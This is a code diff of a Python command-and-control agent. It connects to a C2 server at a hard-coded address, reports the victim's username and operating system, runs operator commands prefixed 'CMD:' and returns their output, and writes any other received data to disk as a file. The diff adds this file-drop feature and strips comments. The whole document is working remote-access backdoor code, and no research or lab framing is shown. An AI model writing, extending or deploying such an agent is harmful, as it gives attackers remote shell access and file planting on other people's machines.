@@ -1,9 +1,7 @@
 import socket
 import subprocess
 import platform
-import getpass  # Module to get the username
-# global client_socket
-client_socket = None
+import getpass
 
 def execute_command(command):
     try:
@@ -12,37 +10,48 @@ def execute_command(command):
     except Exception as e:
         return str(e)
     
-def get_client_socket(socket):
-    global client_socket
-    client_socket = socket
-    return client_socket
+
+def save_received_file(data, file_name):
+    try:
+        with open(file_name, "wb") as f:
+            f.write(data.encode())
+        return "File saved successfully"
+    except Exception as e:
+        return str(e)
+
 
 def main():
-    host = "127.0.0.1"  # IP address of the C2 server
-    port = 8888  # Port the C2 server is listening on
+    host = "127.0.0.1"
+    port = 8888
 
     try:
-        username = getpass.getuser()  # Get the current username
-        client_os = platform.system()  # Get the client's operating system information
+        username = getpass.getuser()
+        client_os = platform.system()
         agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         agent_socket.connect((host, port))
-        print("\nConnected to C2 server as:", username)  # Print the username
-        agent_socket.send(username.encode())  # Send the username to the server
-        agent_socket.send(client_os.encode())  # Send the client's operating system information to the server
+        print("\nConnected to C2 server as:", username)
+        agent_socket.send(username.encode())
+        agent_socket.send(client_os.encode())
         
-        
-        get_client_socket(agent_socket)
-        print('Client socket', client_socket)
-
         while True:
-            command = agent_socket.recv(4096).decode().strip()
-            if not command:
-                continue
-            if command.lower() == "exit":
-                break
-            output = execute_command(command)
-            agent_socket.send(output.encode())
+            data = agent_socket.recv(4096).decode().strip()
 
+            if not data:
+                continue
+
+            if data:
+                if data.startswith("CMD:"):
+                    command = data[len("CMD:"):]
+
+                    if command.lower() == "exit":
+                        break
+
+                    output = execute_command(command)
+                    agent_socket.send(output.encode())
+                else:
+                    output = save_received_file(data, "received_file")
+                    agent_socket.send(output.encode())
+            
         print("\nClosing connection to C2 server")
         agent_socket.close()
     except Exception as e:
